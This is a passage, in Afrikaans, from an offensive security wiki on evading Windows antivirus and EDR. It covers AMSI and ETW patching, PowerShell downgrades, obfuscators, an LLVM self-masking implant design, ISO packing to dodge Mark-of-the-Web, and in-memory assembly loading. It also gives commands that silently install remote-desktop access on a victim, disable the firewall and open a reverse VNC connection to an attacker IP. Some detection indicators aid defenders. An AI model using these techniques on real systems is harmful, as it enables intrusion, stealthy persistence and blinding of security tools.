Die tool **[https://amsibypass.com/](https://amsibypass.com/)** genereer ook scripts om AMSI te omseil en handtekeningopsporing te vermy deur gerandomiseerde gebruikergedefinieerde funksies, veranderlikes en karakteruitdrukkings te gebruik, en deur willekeurige hooflettergebruik op PowerShell-sleutelwoorde toe te pas.

**Verwyder die opgespoorde handtekening**

Jy kan tools soos **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** en **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gebruik om die opgespoorde AMSI-handtekening uit die geheue van die huidige proses te verwyder. Hierdie tool werk deur die geheue van die huidige proses vir die AMSI-handtekening te skandeer en dit dan met NOP-instruksies te oorskryf, wat dit effektief uit die geheue verwyder.

**AV/EDR-produkte wat AMSI gebruik**

Jy kan ’n lys van AV/EDR-produkte wat AMSI gebruik by **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** vind.

**Gebruik PowerShell-weergawe 2**
As jy PowerShell-weergawe 2 gebruik, sal AMSI nie gelaai word nie, dus kan jy jou scripts uitvoer sonder dat AMSI dit skandeer. Jy kan dit so doen:

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell logging is ’n kenmerk waarmee jy alle PowerShell-opdragte wat op ’n stelsel uitgevoer word, kan aanteken. Dit kan nuttig wees vir ouditering en foutopsporing, maar dit kan ook ’n **probleem wees vir aanvallers wat opsporing wil ontduik**.

Om PowerShell logging te omseil, kan jy die volgende tegnieke gebruik:

- **Deaktiveer PowerShell Transcription en Module Logging**: Jy kan ’n nutsding soos [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) hiervoor gebruik.
- **Gebruik PowerShell-weergawe 2**: As jy PowerShell-weergawe 2 gebruik, sal AMSI nie gelaai word nie, sodat jy jou skripte kan uitvoer sonder dat AMSI dit skandeer. Jy kan dit so doen: `powershell.exe -version 2`
- **Gebruik ’n unmanaged PowerShell-sessie**: Gebruik [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) om PowerShell te huisves sonder om `powershell.exe` te begin (die benadering wat Cobalt Strike se `powerpick` gebruik). Dit omseil kontroles wat spesifiek aan die `powershell.exe`-proses gekoppel is, maar deaktiveer nie vanself AMSI, Script Block Logging of elke ander PowerShell-verdediging nie; dekking hang af van die runtime en gasheerimplementering.

## Obfuscation

> [!TIP]
> Verskeie obfuscation-tegnieke maak staat op die enkripsie van data, wat die binêre lêer se entropie verhoog en dit vir AV’s en EDR’s makliker maak om op te spoor. Wees versigtig hiermee en pas enkripsie dalk net toe op spesifieke gedeeltes van jou kode wat sensitief is of versteek moet word.

### Deobfuscating van ConfuserEx-beskermde .NET-binêre lêers

Wanneer jy malware ontleed wat ConfuserEx 2 (of kommersiële variante) gebruik, is dit algemeen om verskeie beskermingslae teë te kom wat decompilers en sandboxes blokkeer. Die werkvloei hieronder **herstel betroubaar ’n byna oorspronklike IL**, wat daarna na C# gedekompileer kan word met nutsmiddels soos dnSpy of ILSpy.<sup>[[10]](#references)</sup>

1. Anti-tampering-verwydering – ConfuserEx enkripteer elke *method body* en dekripteer dit binne die statiese konstrueerder van die *module* (`<Module>.cctor`). Dit verander ook die PE-kontrolesom sodat enige wysiging die binêre lêer laat omval. Gebruik **AntiTamperKiller** om die geënkripteerde metadatatabelle op te spoor, die XOR-sleutels te herwin en ’n skoon assembly te herskryf:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Die uitvoer bevat die 6 anti-tamper-parameters (`key0-key3`, `nameHash`, `internKey`) wat nuttig kan wees wanneer jy jou eie unpacker bou.

2.  Simbool-/beheer-vloei-herstel – voer die *skoon* lêer aan **de4dot-cex** ('n ConfuserEx-bewuste fork van de4dot).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Vlae:
     • `-p crx` – kies die ConfuserEx 2-profiel
     • de4dot sal control-flow flattening ongedaan maak, oorspronklike naamruimtes, klasse en veranderlikename herstel en konstantestrings dekripteer.

3.  Verwydering van proxy-oproepe – ConfuserEx vervang direkte metode-oproepe met liggewig-wrappers (ook bekend as *proxy-oproepe*) om dekompilering verder te bemoeilik. Verwyder hulle met **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Ná hierdie stap behoort jy normale .NET API's soos `Convert.FromBase64String` of `AES.Create()` te sien in plaas van ondeursigtige wrapper-funksies (`Class8.smethod_10`, …).

4.  Handmatige opruiming – laat die resulterende binêre lêer onder dnSpy loop en soek na groot Base64-blokke of gebruik van `RijndaelManaged`/`TripleDESCryptoServiceProvider` om die *werklike* payload te vind.  Dikwels stoor die malware dit as 'n TLV-geënkodeerde byte-skikking wat binne `<Module>.byte_0` geïnisialiseer word.

Die bogenoemde ketting herstel die uitvoeringsvloei **sonder** dat die kwaadwillige voorbeeld uitgevoer hoef te word – nuttig wanneer jy op 'n vanlyn werkstasie werk.

> 🛈  ConfuserEx skep 'n pasgemaakte attribuut genaamd `ConfusedByAttribute` wat as 'n IOC gebruik kan word om voorbeelde outomaties te triageer.

#### Eenreël-opdrag
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C#-obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Die doel van hierdie projek is om ’n oopbron-fork van die [LLVM](http://www.llvm.org/)-samestellingsuite te verskaf wat verhoogde sagtewaresekuriteit kan bied deur middel van [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) en peuterbeskerming.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstreer hoe die `C++11/14`-taal gebruik kan word om tydens samestelling geobfuskeerde kode te genereer, sonder enige eksterne nutsmiddel en sonder om die samesteller te wysig.
- [**obfy**](https://github.com/fritzone/obfy): Voeg ’n laag geobfuskeerde bewerkings by wat deur die C++-template-metaprogrammeringsraamwerk gegenereer word, wat die lewe ’n bietjie moeiliker maak vir iemand wat die toepassing wil kraak.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz is ’n x64-binêre obfuscator wat verskillende PE-lêers kan obfuskeer, insluitend .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame is ’n eenvoudige metamorfiese kode-enjin vir arbitrêre uitvoerbare lêers.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is ’n fynkorrelige kode-obfuskeeringsraamwerk vir LLVM-ondersteunde tale wat ROP (return-oriented programming) gebruik. ROPfuscator obfuskeer ’n program op die samestellingskodeniveau deur gewone instruksies in ROP-kettings om te skakel, wat ons natuurlike begrip van normale beheervloei verydel.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is ’n .NET PE Crypter wat in Nim geskryf is
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kan bestaande EXE/DLL na shellcode omskakel en dit dan laai

### LLVM-samestellerondersteunde selfmaskering per funksie

In plaas daarvan om ’n hele implant slegs te masker terwyl dit slaap, kan ’n gewysigde LLVM X86-backend geselekteerde funksies XOR-masker wanneer hulle onaktief is. Die Function Peekaboo PoC kies gedemangleerde name wat `REG_` bevat, voeg posisie-onafhanklike begin-/eindstubs om die finale masjienkode in, en genereer een gedeelde masker-handler in `.text`; handtekeninge op bronkodeniveau en die Windows x64-aanroepkonvensie bly onveranderd.<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend-beheervloeitransformasie

Dit hoort ná instruksiekeuse en optimalisering, omdat die transformasie **elke gegenereerde return** moet dek en die presiese x86-uitleg moet ken. ’n `MachineFunctionPass` wat voor uitset plaasvind, vind die laaste `MachineInstr::isReturn()`, verwyder dit sodat die finale pad deurval na die bygevoegde epiloog, en vervang vroeëre returns met `JMP_1 handler`. Behou enige samestellergeskepte stapel-/raam-afbreking wat voor elke return plaasvind; herlei slegs die return-instruksie self.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` en `emitFunctionBodyEnd()` genereer die begin-/eindstubs per funksie, terwyl `emitEndOfAsmFile()` die handler genereer. Simbole wat tussen uitsetfases gedeel word, laat ’n proloogvertakking toe om na sy latere epiloog te mik; skryf vir ’n handmatig gegenereerde nabye `je` `0F 84` gevolg deur die viergreep-MC-uitdrukking `target - address_after_je`. Oproepe en spronge na die handler kan eerder as `MCInst`-objekte gegenereer word (`CALL64pcrel32` en `JMP_1`). ’n Pass moet `false` teruggee vir ’n funksie wat nie gekies is nie, indien dit niks verander het; die PoC gee verkeerdelik `true` terug op daardie pad.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata en inisialisering voor die CRT

Die PoC plaas ’n XOR-sleutel en rekords van 16 grepe met ’n laaier-herlokeerde funksiewyser plus ’n looptydlengte in `.funcmeta`. Hoewel die C-veld ’n `uint32_t` is, kry die handler toegang tot ’n QWORD by rekordverskuiwing `+8`, wat die lengte en sy opvulling gebruik, en beweeg rekords aan met `0x10`. PE-afdelingname is slegs agt grepe lank, dus sien die looptyd-opsoek `.funcmet`. ’n Eksterne patcher voeg ’n uitvoerbare `.stub` by, stoor die ou toegangspunt-RVA in die stub en herlei `AddressOfEntryPoint`; die PIC-stub kry die beeldbasis vanaf `gs:[0x60]` → `[PEB+0x10]`, deurloop PE32+-invoere om ’n reeds ingevoerde `VirtualProtect` op te los, en loop voor die CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Inisialisering stel ’n sentinel in `gs:[0xE8]` en roep elke metadatafunksie aan. Die permanent leesbare proloog teken die funksiebegin in `gs:[0xF0]` aan, bespeur die sentinel en slaan die liggaam oor, wat nog nie gemasker is nie. Die epiloog gebruik dan `call handler`; nadat die handler 13 registers (`0x68` grepe) gestoor het, is die return-adres by `[rsp+0x68]` die einde van die getransformeerde funksie, sodat `end - start` in sy metadatarekord geskryf kan word. Nadat alle liggame gemasker is, vee die stub die sentinel uit en spring na `ImageBase + original_entry_point_RVA`.<sup>[[38]](#references)[[39]](#references)</sup>

Tydens ’n gewone oproep roep die proloog dieselfde simmetriese handler aan om die liggaam te dekodeer. Die finale pad val deur na die bygevoegde epiloog, terwyl elke vroeëre return reguit na die gedeelde handler spring. Die gewone epiloog gebruik ook `jmp handler` eerder as `call`, sodat die handler se `ret` die oorspronklike return-adres van die oproeper gebruik nadat dit weer gemasker het, en die funksieresultaat in `RAX` behoue bly.<sup>[[38]](#references)[[39]](#references)</sup>

#### Maskeringsprimitief en analise-aanwysers

Die handler vind die huidige rekord, slaan die vaste sigbare proloog oor (`0x46` grepe in hierdie bou), verander die res na `PAGE_EXECUTE_READWRITE`, XOR dit greep vir greep met die lae greep van die sleutel, en stel dit dan op `PAGE_EXECUTE_READ`. Dieselfde lus dekodeer dus wanneer die funksie binnegegaan word en enkodeer dit by elke normale uitgang.<sup>[[38]](#references)[[39]](#references)</sup>

Hoësein-aanwysers vir hierdie ontwerp sluit in:<sup>[[38]](#references)[[39]](#references)</sup>

- ’n toegangspunt binne ’n uitvoerbare `.stub` en ’n `.funcmet`-afdeling met ’n sleutel plus herlokeerde `.text`-wysers;
- PEB-, invoertabel- en afdelingtabel-ontleding voor die CRT, gevolg deur oproepe deur elke metadatawyser;
- identiese PIC-proloë met `call`/`pop` en baie return-plekke wat na een handler herlei word;
- skrywes na `gs:[0xE8]`, `gs:[0xF0]` en `gs:[0xF8]`, gevolg deur herhaalde `VirtualProtect`-oorgange en greep-vir-greep XOR-skrywes na beeldgesteunde uitvoerbare bladsye.

Dit is ontduiking van geheueskandeerders, nie kriptografiese beskerming nie: die gelapte lêer bevat steeds die oorspronklike ongeënkodeerde liggaam, en ’n debugger kan by `VirtualProtect` of die XOR-lus stop en die aktiewe funksie dump. Die enkelsgreep-XOR, leesbare metadata en vaste `0x46`-grens maak vanlyn-herwinning ook eenvoudig.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Die PoC se TEB-gleuwe is thread-lokaal, maar die gewysigde kodebladsye is proseswyd. Gelyktydige of rekursiewe toegang kan instruksies dus weer omskakel terwyl ’n ander aanroep dit uitvoer; uitsonderings en nie-plaaslike uitgange kan ook keer dat hermaskering plaasvind. ’n Robuuste implementering moet oorgange sinchroniseer, die beskerming herstel wat werklik via `lpflOldProtect` teruggegee is, hardgekodeerde stublengtes vermy, beide `call`- en `jmp`-paaie vir x64-stapelbelyning nagaan, en `FlushInstructionCache` aanroep nadat uitvoerbare grepe herskryf is. Microsoft plaas uitdruklik die verantwoordelikheid vir instruksiekas-samehang by die oproeper wanneer uitvoerbare kode gewysig word.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Jy het dalk hierdie skerm gesien wanneer jy sommige uitvoerbare lêers van die internet aflaai en uitvoer.

Microsoft Defender SmartScreen is ’n sekuriteitsmeganisme wat bedoel is om eindgebruikers te beskerm teen die uitvoer van potensieel kwaadwillige toepassings.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen werk hoofsaaklik volgens ’n reputasiegebaseerde benadering, wat beteken dat toepassings wat nie dikwels afgelaai word nie, SmartScreen sal aktiveer en die eindgebruiker waarsku en verhinder om die lêer uit te voer (hoewel die lêer steeds uitgevoer kan word deur More Info -> Run anyway te klik).

**MoTW** (Mark of The Web) is ’n [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) met die naam Zone.Identifier, wat outomaties geskep word wanneer lêers van die internet afgelaai word, saam met die URL waarvandaan dit afgelaai is.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kontroleer die Zone.Identifier ADS vir ’n lêer wat van die internet afgelaai is.</p></figcaption></figure>

> [!TIP]
> Dit is belangrik om daarop te let dat uitvoerbare lêers wat met ’n **trusted**-ondertekeningsertifikaat onderteken is, **nie SmartScreen sal aktiveer nie**.

’n Baie doeltreffende manier om te keer dat jou payloads die Mark of The Web kry, is om hulle in ’n soort houer, soos ’n ISO, te verpak. Dit werk omdat Mark-of-the-Web (MOTW) **nie** op **nie-NTFS**-volumes toegepas kan word nie.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is ’n nutsmiddel wat payloads in uitvoerhouers verpak om Mark-of-the-Web te ontduik.

Voorbeeldgebruik:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Hier is ’n demonstrasie van hoe om SmartScreen te omseil deur payloads in ISO-lêers te verpak met [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) is ’n kragtige logmeganisme in Windows waarmee toepassings en stelselkomponente **gebeurtenisse kan aanteken**. Sekuriteitsprodukte kan dit egter ook gebruik om kwaadwillige aktiwiteite te monitor en op te spoor.

Net soos AMSI gedeaktiveer (omseil) kan word, is dit ook moontlik om die **`EtwEventWrite`**-funksie van die gebruikersruimteproses onmiddellik te laat terugkeer sonder om enige gebeurtenisse aan te teken. Dit word gedoen deur die funksie in die geheue te patch sodat dit onmiddellik terugkeer, wat ETW-logboekhouding vir daardie proses effektief deaktiveer.

Jy kan meer inligting vind in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) en [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Dit is al ’n geruime tyd bekend dat C#-binaries in die geheue gelaai kan word, en dit is steeds ’n baie goeie manier om jou post-exploitation-nutsgoed uit te voer sonder om deur AV betrap te word.

Aangesien die payload direk in die geheue gelaai word sonder om aan die skyf te raak, hoef ons net bekommerd te wees oor die patch van AMSI vir die hele proses.

Die meeste C2-frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, ens.) bied reeds die vermoë om C#-assemblies direk in die geheue uit te voer, maar daar is verskillende maniere om dit te doen:

- **Fork\&Run**

Dit behels dat **’n nuwe weggooiproses begin word**, jou post-exploitation-kwaadwillige kode in daardie nuwe proses geïnject word, jou kwaadwillige kode uitgevoer word en die nuwe proses beëindig word wanneer dit klaar is. Dit het beide voordele en nadele. Die voordeel van die fork and run-metode is dat uitvoering **buite** ons Beacon-implantproses plaasvind. Dit beteken dat as iets tydens ons post-exploitation-aksie verkeerd loop of opgespoor word, daar ’n **veel groter kans** is dat ons **implant oorleef.** Die nadeel is dat daar ’n **groter kans** is dat jy deur **gedragsgebaseerde opsporing** betrap word.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dit behels dat die post-exploitation-kwaadwillige kode **in sy eie proses** geïnject word. Só kan jy vermy dat jy ’n nuwe proses moet skep en dit deur AV moet laat skandeer, maar die nadeel is dat as iets met die uitvoering van jou payload verkeerd loop, daar ’n **veel groter kans** is dat jy jou **beacon verloor**, aangesien dit kan crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> As jy meer wil lees oor die laai van C#-assemblies, lees gerus hierdie artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) en hul InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Jy kan ook C#-assemblies **vanuit PowerShell** laai; kyk na [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) en [S3cur3th1sSh1t se video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## NativeAOT WebAssembly-herverpakking van .NET-nutsgoed (WasmForge)

Gewone `execute-assembly`-tegnieke behou herkenbare MSIL en initialiseer uiteindelik ’n CLR. **WasmForge** verander eerder die uitvoeringsomgewing: dit migreer ’n C#-projek na die eksperimentele NativeAOT-LLVM WASI-teiken, kompileer dit vooraf na WebAssembly en sluit daardie module in ’n Wazero-gebaseerde Windows PE-gasheer in. Die gevolglike proses benodig nie die teiken se CLR, JIT of `dotnet`-gasheer nie; daarom verloor reëls wat slegs op name van managed assemblies, CLR-laai, AMSI of .NET ETW staatmaak, direkte sigbaarheid. Dit is ’n ontduikings-/verpakkingstegniek, nie ’n omseiling van ’n voorreggrens nie—die gasproses behou die oorspronklike nutsding se toestemmings en waarneembare OS-gedrag.<sup>[[44]](#references)[[45]](#references)</sup>

### Bou van ’n C#-projek

Die aanbevole boumetode is die projek se Docker-omgewing, aangesien dit die .NET 10 SDK, NativeAOT-LLVM-werklas, WASI SDK 24.0, linker en afhanklikhede vir ondertekening insluit. ’n `.csproj` word outomaties opgespoor; die eenmalige bouproses voer migrasie, versoenbaarheidspatching, WASM-kompilering, PE-vervaardiging en ondertekening uit.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Vir foutopsporing of hersiening van gegenereerde kode, verdeel die proses in `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm`, en ’n finale `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. Die boubeeld gebruik ook ’n `wasm-component-ld`-omhulsel om die WASI Preview 2-komponentenkodering te vermy en die gewone module te lewer wat die ingebedde runtime verwag.<sup>[[44]](#references)[[45]](#references)</sup>

### Oorbrugging van wasm32 C# na x64 Win32

Dit is nie ’n deursigtige herkompilering nie. NativeAOT-WASI het nie sommige Windows-gerigte BCL-kenmerke nie, of verander dit, en ’n wasm32-gasheer ken gewoonlik viergreep-wysergleuwe toe, terwyl x64-API’s agtgreep-wysers kan teruggee. WasmForge spreek albei probleme aan met die volgende gegenereerde lae:<sup>[[44]](#references)</sup>

1. ’n Bronpleisterprogram herstel AOT-spesifieke semantiese verskille en herlei nie-ondersteunde registry-, pipes-, WMI-, identity-, directory-service-, file-version-, LSA- en soortgelyke oproepe na `Wf*`-hulpfunksies.
2. ’n P/Invoke-skandeerder genereer NativeAOT `DirectPInvoke`-karterings sodat `[DllImport]`-oproepe aan gekoppelde C-bridge-simbole bind, eerder as om die verklaarde DLL dinamies binne die gasheer te laai.
3. Gashere-gerigte wysers gebruik `ulong` in C# en `uint64_t` in C. ’n Generiese dispatcher stuur die oproep aan die gasheer se Win32-hanteerder deur; ’n `out8_mask` merk egte agtgreep-afvoerleuwe waarvan die boonste helftes behou moet word. Ongeïdentifiseerde wasm32-vormige afvoerlewe gebruik momentopname-/herstelbeskerming sodat ’n x64-skryfbewerking nie die aangrensende vier grepe beskadig nie.
4. Toegewyde gasheer-bridges hanteer bewerkings wat nie by generiese syscall-dispatch pas nie, soos LSA-toegang tot ticket-cache, Kerberos-/BCrypt-bewerkings met gestruktureerde resultate, TCP KDC-verkeer en LDAP-navrae.

Byvoorbeeld, ’n wrapper vir `version.dll!VerQueryValueW` stuur vier gasheeradresse deur en stel bisse 2 en 3 (`0xC`) omdat die waarde-wyser en lengte agtgreep-afvoerlewe is. Die wrapper self bly generies en delegeer die DLL-naam, export-naam, argumente en masker aan `wf_call_v2`; die gasheer voer wyservertaling uit en roep die inheemse API aan.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Beperkings en opsporingswenke

Kode wat swaar op reflection steun, dinamiese assembly-laai, arbitrêre native callbacks en komplekse x64-strukture wat na WASM-geheue teruggestuur word, kan steeds per-tool-patches vereis of heeltemal misluk. Generiese WASI Preview 2-sockets kan ook no-op-stubs bereik, daarom gebruik ondersteunde tools protokolspesifieke host-shims. Valideer elke opdrag teen ’n native build eerder as om feature-pariteit te aanvaar.<sup>[[44]](#references)[[45]](#references)</sup>

Die tegniek verskuif telemetrie eerder as om die payload onsigbaar te maak. Opsporing kan fokus op ’n PE wat ’n WASM-module bevat of materialiseer, Wazero-agtige runtime-gedrag, ongewone toewysing en kopiëring van host/guest-geheue, generiese direkte Win32-dispatch, afwykings in ondertekening en PE-resources, plus die gevolglike API-oproepe en netwerkverkeer. Die afwesigheid van CLR-load-, AMSI- of .NET ETW-gebeurtenisse moet dus nie as bewys beskou word dat ’n proses goedaardig is nie.<sup>[[44]](#references)</sup>

## Gebruik van Ander Programmeringstale

Soos voorgestel in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), is dit moontlik om kwaadwillige kode met ander tale uit te voer deur die gekompromitteerde masjien toegang te gee **tot die interpreter-omgewing wat op die aanvallerbeheerde SMB-share geïnstalleer is**.

Deur toegang tot die Interpreter Binaries en die omgewing op die SMB-share toe te laat, kan jy **arbitrêre kode in hierdie tale binne die geheue** van die gekompromitteerde masjien uitvoer.

Die repo dui aan: Defender skandeer steeds die scripts, maar deur Go, Java, PHP, ens. te gebruik, het ons **meer buigsaamheid om statiese signatures te omseil**. Toetse met ewekansige, nie-geobfuskeerde reverse shell-scripts in hierdie tale was suksesvol.

## WebAssembly-herhuisvesting vir ontduiking van statiese analise

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping manipuleer die access token van ’n sekuriteitsproduk soos ’n EDR of AV. Deur die token se regte te verminder, kan die proses aan die gang bly, maar verhinder word om bevoorregte inspeksie- of remediëringsaksies uit te voer.

Om dit te voorkom, kan Windows **eksterne prosesse verhoed** om handles na sekuriteitsprosesse se tokens te kry.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Gebruik van Betroubare Sagteware

### Chrome Remote Desktop

Soos beskryf in [**hierdie blogplasing**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), is dit maklik om Chrome Remote Desktop op ’n slagoffer se rekenaar te installeer en dit dan te gebruik om beheer daaroor te verkry en volharding te behou:<sup>[[35]](#references)</sup>
1. Laai dit af by https://remotedesktop.google.com/, klik op "Set up via SSH", en klik dan op die MSI-lêer vir Windows om dit af te laai.
2. Laat die installeerder stilweg op die slagoffer se masjien loop (admin word vereis): `msiexec /i chromeremotedesktophost.msi /qn`
3. Gaan terug na die Chrome Remote Desktop-bladsy en klik op volgende. Die wizard sal jou dan vra om te magtig; klik op die Authorize-knoppie om voort te gaan.
4. Voer die verskafte opdrag met die nodige aanpassings uit: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (die `--pin`-parameter stel die PIN sonder om die GUI te gebruik).
 

## Gevorderde Evasion

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Evasion is ’n baie ingewikkelde onderwerp; soms moet jy talle verskillende telemetriebronne op net een stelsel in ag neem, dus is dit feitlik onmoontlik om in volwasse omgewings heeltemal onopgespoor te bly.

Elke omgewing waarteen jy optree, het sy eie sterk- en swakpunte.

Ek moedig jou sterk aan om hierdie praatjie van [@ATTL4S](https://twitter.com/DaniLJ94) te kyk om ’n vastrapplek in meer gevorderde Evasion-tegnieke te kry.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Dit is ook nog ’n uitstekende praatjie van [@mariuszbit](https://twitter.com/mariuszbit) oor Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Ou Tegnieke**

### **Kontroleer watter dele Defender as kwaadwillig beskou**

Jy kan [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) gebruik; dit sal **dele van die binary verwyder** totdat dit **uitvind watter deel Defender** as kwaadwillig beskou, en dit dan vir jou uitsonder.\
Nog ’n tool wat **dieselfde doen, is** [**avred**](https://github.com/dobin/avred), met ’n oop webdiens wat dit by [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) aanbied.

### **Telnet-bediener**

Tot en met Windows10 het alle Windows-weergawes ’n **Telnet-bediener** ingesluit wat jy kon installeer (as administrateur) deur die volgende uit te voer:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Laat dit **begin** wanneer die stelsel begin, en **voer** dit nou uit:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Verander telnet-poort** (stealth) en deaktiveer firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Laai dit af vanaf: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (jy wil die bin-aflaaie hê, nie die setup nie)

**OP DIE HOST**: Voer _**winvnc.exe**_ uit en stel die bediener op:

- Aktiveer die opsie _Disable TrayIcon_
- Stel ’n wagwoord in _VNC Password_
- Stel ’n wagwoord in _View-Only Password_

Skuif dan die binêre lêer _**winvnc.exe**_ en die **nuut** geskepte lêer _**UltraVNC.ini**_ na die **victim**

#### **Omgekeerde verbinding**

Die **attacker** moet die binêre lêer `vncviewer.exe -listen 5900` **op sy host uitvoer**, sodat dit **gereed** is om ’n omgekeerde **VNC-verbinding** te ontvang. Begin dan binne die **victim** die winvnc-daemon `winvnc.exe -run` en voer `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` uit.

**WAARSKUWING:** Om stealth te behou, moet jy ’n paar dinge nie doen nie

- Moenie `winvnc` begin as dit reeds loop nie, anders sal jy ’n [popup](https://i.imgur.com/1SROTTl.png) veroorsaak. Kyk of dit loop met `tasklist | findstr winvnc`
- Moenie `winvnc` begin sonder `UltraVNC.ini` in dieselfde gids nie, anders sal [die konfigurasievenster](https://i.imgur.com/rfMQWcf.png) oopmaak
- Moenie `winvnc -h` uitvoer vir hulp nie, anders sal jy ’n [popup](https://i.imgur.com/oc18wcu.png) veroorsaak

### GreatSCT

Laai dit af vanaf: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
